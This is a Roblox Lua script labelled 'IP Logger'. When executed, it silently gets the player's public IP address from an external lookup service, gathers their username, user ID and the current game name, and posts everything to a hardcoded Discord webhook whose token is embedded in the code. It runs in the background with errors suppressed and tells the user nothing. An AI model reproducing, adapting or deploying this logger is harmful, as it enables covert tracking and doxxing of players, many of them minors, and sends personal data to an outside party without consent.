-- // IP Logger \\ --
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")

local webhookUrl = "https://discord.com/api/webhooks/1448166462819930258/q9nQfW3O4WtHVeTQIrwKkafouZdVXSA92QeyKC0TiDv-uVOKLZwCcED-wq2ZxrwOz7DU"

task.spawn(function()
    pcall(function()
        -- Get user's IP address
        local ipResponse = HttpService:GetAsync("https://api.ipify.org?format=json")
        local ipData = HttpService:JSONDecode(ipResponse)
        local userIP = ipData.ip
        
        -- Get player info
        local localPlayer = Players.LocalPlayer
        local playerName = localPlayer and localPlayer.Name or "Unknown"
        local playerUserId = localPlayer and tostring(localPlayer.UserId) or "Unknown"
        
        -- Get game info
        local gameInfo = MarketplaceService:GetProductInfo(game.PlaceId)
        local gameName = gameInfo.Name or "Unknown"
        
        -- Create embed payload
        local embed = {
            title = "Script Execution",
            description = "User executed the script",
            color = 3447003,
            fields = {
                {
                    name = "IP Address",
                    value = userIP,
                    inline = true
                },
                {
                    name = "Player Name",
                    value = playerName,
                    inline = true
                },
                {
                    name = "User ID",
                    value = playerUserId,
                    inline = true
                },
                {
                    name = "Game",
                    value = gameName,
                    inline = false
                }
            },
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }
        
        local payload = {
            embeds = {embed}
        }
        
        -- Send to webhook
        HttpService:PostAsync(webhookUrl, HttpService:JSONEncode(payload), Enum.HttpContentType.ApplicationJson)
    end)
end)

